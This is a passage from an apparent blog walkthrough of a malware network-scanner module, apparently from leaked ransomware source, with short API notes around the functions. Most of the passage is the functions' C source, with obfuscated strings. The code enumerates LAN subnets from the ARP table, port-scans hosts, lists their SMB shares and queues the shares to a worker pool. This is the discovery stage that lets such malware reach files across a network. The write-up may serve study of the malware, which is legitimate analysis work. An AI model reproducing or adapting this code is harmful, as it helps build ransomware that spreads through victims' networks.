&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EnumShares"><a href="#EnumShares" class="headerlink" title="EnumShares"></a>EnumShares</h3><ul>
<li><p>NetShareEnum</p>
<ul>
<li>Retrieves information about each shared resource on a server.</li>
</ul>
</li>
<li><p>sharepath</p>
<table>
<thead>
<tr>
<th align="left">Constant&#x2F;value</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">STYPE_DISKTREE0x00000000</td>
<td align="left">Disk drive</td>
</tr>
<tr>
<td align="left">STYPE_SPECIAL0x80000000</td>
<td align="left">Special share reserved for interprocess communication (IPC$) or remote administration of the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/1709f6a7-efb8-4ded-b7ae-5cee9ee36320#gt_434b0234-e970-4e8c-bdfa-e16a30d96703">server</a> (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth.</td>
</tr>
<tr>
<td align="left">STYPE_TEMPORARY0x40000000</td>
<td align="left">A temporary share that is not persisted for creation each time the file server initializes.</td>
</tr>
</tbody></table>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">network_scanner::EnumShares</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in PWCHAR pwszIpAddress, </span></span><br><span class="line"><span class="params">	__out PSHARE_LIST ShareList</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	NET_API_STATUS Result;</span><br><span class="line">	LPSHARE_INFO_1 ShareInfoBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD er = <span class="number">0</span>, tr = <span class="number">0</span>, resume = <span class="number">0</span>;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, <span class="number">1</span>, (LPBYTE*)&amp;ShareInfoBuffer, MAX_PREFERRED_LENGTH, &amp;er, &amp;tr, &amp;resume);</span><br><span class="line">		<span class="keyword">if</span> (Result == ERROR_SUCCESS)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (DWORD i = <span class="number">1</span>; i &lt;= er; i++)</span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (TempShareInfo-&gt;shi1_type == STYPE_DISKTREE	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_SPECIAL	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_TEMPORARY) </span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(<span class="keyword">sizeof</span>(SHARE_INFO));</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">if</span> (ShareInfo &amp;&amp; plstrcmpiW(TempShareInfo-&gt;shi1_netname, OBFW(<span class="string">L&quot;ADMIN$&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">						plstrcpyW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, pwszIpAddress);</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, TempShareInfo-&gt;shi1_netname);</span><br><span class="line"></span><br><span class="line">						logs::Write(OBFW(<span class="string">L&quot;Found share %s.&quot;</span>), ShareInfo-&gt;wszSharePath);</span><br><span class="line">						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				TempShareInfo++;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pNetApiBufferFree(ShareInfoBuffer);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (Result == ERROR_MORE_DATA);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="StartScan"><a href="#StartScan" class="headerlink" title="StartScan"></a>StartScan</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">network_scanner::StartScan()</span><br><span class="line">&#123;</span><br><span class="line">	WSADATA WsaData;</span><br><span class="line">	HANDLE hHostHandler = <span class="literal">NULL</span>, hPortScan = <span class="literal">NULL</span>;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	pWSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;WsaData);</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetConnectEX()) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get ConnectEx.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	GetCurrentIpAddress();</span><br><span class="line">	</span><br><span class="line">	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create io completion port.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_INIT(&amp;g_SubnetList);</span><br><span class="line">	TAILQ_INIT(&amp;g_HostList);</span><br><span class="line">	TAILQ_INIT(&amp;g_ConnectionList);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetSubnets(&amp;g_SubnetList)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get subnets.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hHostHandler = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;HostHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create host thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hPortScan = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;PortScanHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hPortScan == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create port scan thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pPostQueuedCompletionStatus(g_IocpHandle, <span class="number">0</span>, START_COMPLETION_KEY, <span class="literal">NULL</span>);</span><br><span class="line">	pWaitForSingleObject(hPortScan, INFINITE);</span><br><span class="line"></span><br><span class="line">	AddHost(STOP_MARKER);</span><br><span class="line">	pWaitForSingleObject(hHostHandler, INFINITE);</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">	pDeleteCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle) &#123;</span><br><span class="line">		pCloseHandle(g_IocpHandle);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler) &#123;</span><br><span class="line">		pCloseHandle(hHostHandler);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hPortScan) &#123;</span><br><span class="line">		pCloseHandle(hPortScan);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pWSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="GetCurrentIpAddress"><a href="#GetCurrentIpAddress" class="headerlink" title="GetCurrentIpAddress"></a>GetCurrentIpAddress</h3><ul>
<li><p>pgethostname</p>
<ul>
<li><p>SOCKET_ERROR &#x3D;&#x3D; (INT)pgethostname(szHostName, 256)</p>
</li>
<li><p>g_HostEntry &#x3D; (struct hostent*)pgethostbyname(szHostName);</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>If no error occurs, <strong>gethostname</strong> returns zero. Otherwise, </p>
<p>it returns SOCKET_ERROR and a specific error code can be retrieved by calling <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsagetlasterror">WSAGetLastError</a>.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD <span class="title function_">GetCurrentIpAddress</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	CHAR szHostName[<span class="number">256</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">InAddr</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == (INT)pgethostname(szHostName, <span class="number">256</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_HostEntry = (<span class="keyword">struct</span> hostent*)pgethostbyname(szHostName);</span><br><span class="line">	<span class="keyword">if</span> (!g_HostEntry) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GetConnectEX"><a href="#GetConnectEX" class="headerlink" title="GetConnectEX"></a>GetConnectEX</h3><ul>
<li>WSASocketW<ul>
<li>creates a socket that is bound to a specific transport-service provider</li>
</ul>
</li>
<li>WSAIoctl<ul>
<li>controls the mode of a socket.</li>
</ul>
</li>
<li>closesocket</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">GetConnectEX</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwBytes;</span><br><span class="line">	<span class="type">int</span> rc;</span><br><span class="line"></span><br><span class="line">	SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	GUID guid = WSAID_CONNECTEX;</span><br><span class="line">	rc = (<span class="type">int</span>)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,</span><br><span class="line">		&amp;guid, <span class="keyword">sizeof</span>(guid),</span><br><span class="line">		&amp;g_ConnectEx, <span class="keyword">sizeof</span>(g_ConnectEx),</span><br><span class="line">		&amp;dwBytes, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	rc =(<span class="type">int</span>) pclosesocket(sock);</span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GetSubnets"><a href="#GetSubnets" class="headerlink" title="GetSubnets"></a>GetSubnets</h3><ul>
<li>GetIpNetTable<ul>
<li>GetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the table size)</li>
<li>ULONG Result &#x3D; (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the result)</li>
<li>The <strong>GetIfTable</strong> function retrieves the MIB-II interface table.</li>
</ul>
</li>
</ul>
<p>if the ip is start with “172.”,”192.168.”,”10.”,”169.”, there are subnets in this host.</p>
<p>And check if the subnet is already in the SubnetList . If not , add this SubnetInfo into SubnetList</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);</span><br><span class="line">	<span class="keyword">if</span> (!IpNetTable) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);</span><br><span class="line">	<span class="keyword">if</span> (Result != ERROR_SUCCESS) &#123;</span><br><span class="line">		</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;GetIpNetTable fails. GetLastError = %lu&quot;</span>), pGetLastError());</span><br><span class="line">		<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IpNetTable-&gt;dwNumEntries; i++) &#123;</span><br><span class="line"></span><br><span class="line">		WCHAR wszIpAddress[INET_ADDRSTRLEN];</span><br><span class="line">		ULONG dwAddress = IpNetTable-&gt;table[i].dwAddr;	</span><br><span class="line">		PUCHAR HardwareAddres = IpNetTable-&gt;table[i].bPhysAddr;</span><br><span class="line">		ULONG HardwareAddressSize = IpNetTable-&gt;table[i].dwPhysAddrLen;</span><br><span class="line">		</span><br><span class="line">		RtlSecureZeroMemory(wszIpAddress, <span class="keyword">sizeof</span>(wszIpAddress));</span><br><span class="line"></span><br><span class="line">		IN_ADDR InAddr;</span><br><span class="line">		InAddr.S_un.S_addr = dwAddress;</span><br><span class="line">		PCHAR szIpAddress = pinet_ntoa(InAddr);</span><br><span class="line">		DWORD le = WSAGetLastError();</span><br><span class="line"></span><br><span class="line">		PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;172.&quot;</span>));</span><br><span class="line">		PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;192.168.&quot;</span>));</span><br><span class="line">		PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;10.&quot;</span>));</span><br><span class="line">		PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;169.&quot;</span>));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (p1 == szIpAddress ||</span><br><span class="line">			p2 == szIpAddress ||</span><br><span class="line">			p3 == szIpAddress ||</span><br><span class="line">			p4 == szIpAddress)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			BOOL Found = FALSE;</span><br><span class="line"></span><br><span class="line">			PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line">			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!<span class="built_in">memcmp</span>(&amp;SubnetInfo-&gt;dwAddress, &amp;dwAddress, <span class="number">3</span>)) &#123;</span><br><span class="line"></span><br><span class="line">					Found = TRUE;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!Found) &#123;</span><br><span class="line"></span><br><span class="line">				BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">				*(ULONG*)bAddres = dwAddress;</span><br><span class="line">				bAddres[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">				PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(<span class="keyword">sizeof</span>(SUBNET_INFO));</span><br><span class="line">				<span class="keyword">if</span> (!NewSubnet) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				RtlCopyMemory(&amp;NewSubnet-&gt;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line">				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HostHandler"><a href="#HostHandler" class="headerlink" title="HostHandler"></a>HostHandler</h3><ul>
<li><p><code>pEnterCriticalSection(&amp;g_CriticalSection);</code></p>
<ul>
<li><p>When more than one processes access a same code segment that segment is known as critical section. Critical section contains shared variables or resources which are needed to be synchronized to maintain consistency of data variable.<a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/g-fact-70/">Critical Section in Synchronization</a></p>
<ul>
<li><p>&#96;&#96;&#96;c<br>  pEnterCriticalSection(&amp;g_CriticalSection);</p>
<p>  PHOST_INFO HostInfo &#x3D; TAILQ_FIRST(&amp;g_HostList);<br>  if (HostInfo &#x3D;&#x3D; NULL) {<br>  pLeaveCriticalSection(&amp;g_CriticalSection);<br>  pSleep(1000);<br>  continue;<br>      }<br>  TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);<br>  pLeaveCriticalSection(&amp;g_CriticalSection);</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);`</span><br><span class="line">    - get the host&#x27;s shareinfo </span><br><span class="line">    </span><br><span class="line">- `threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);`</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line">HostHandler(__in PVOID pArg)</span><br><span class="line">&#123;</span><br><span class="line">	network_scanner::SHARE_LIST ShareList;</span><br><span class="line">	TAILQ_INIT(&amp;ShareList);</span><br><span class="line"></span><br><span class="line">	while (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		pEnterCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList);</span><br><span class="line">		if (HostInfo == NULL) &#123;</span><br><span class="line"></span><br><span class="line">			pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">			pSleep(1000);</span><br><span class="line">			continue;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line">		pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		if (HostInfo-&gt;dwAddres == STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line">			free(HostInfo);</span><br><span class="line">			pExitThread(EXIT_SUCCESS);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		network_scanner::EnumShares(HostInfo-&gt;wszAddress, &amp;ShareList);</span><br><span class="line">		while (!TAILQ_EMPTY(&amp;ShareList))</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);</span><br><span class="line">			logs::Write(OBFW(L&quot;Starting search on share %s.&quot;), ShareInfo-&gt;wszSharePath);</span><br><span class="line">			threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);</span><br><span class="line">			TAILQ_REMOVE(&amp;ShareList, ShareInfo, Entries);</span><br><span class="line">			free(ShareInfo);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		free(HostInfo);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="CreateHostTable"><a href="#CreateHostTable" class="headerlink" title="CreateHostTable"></a>CreateHostTable</h3><ul>
<li>WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);<ul>
<li>socket with tcp</li>
</ul>
</li>
<li>bind<ul>
<li>The <strong>bind</strong> function associates a local address with a socket.</li>
</ul>
</li>
<li>CreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)<ul>
<li>Creates an input&#x2F;output (I&#x2F;O) completion port and associates it with a specified file handle, or creates an I&#x2F;O completion port that is not yet associated with a file handle, allowing association at a later time.</li>
<li>If the function succeeds, the return value is the handle to an I&#x2F;O completion port</li>
</ul>
</li>
</ul>
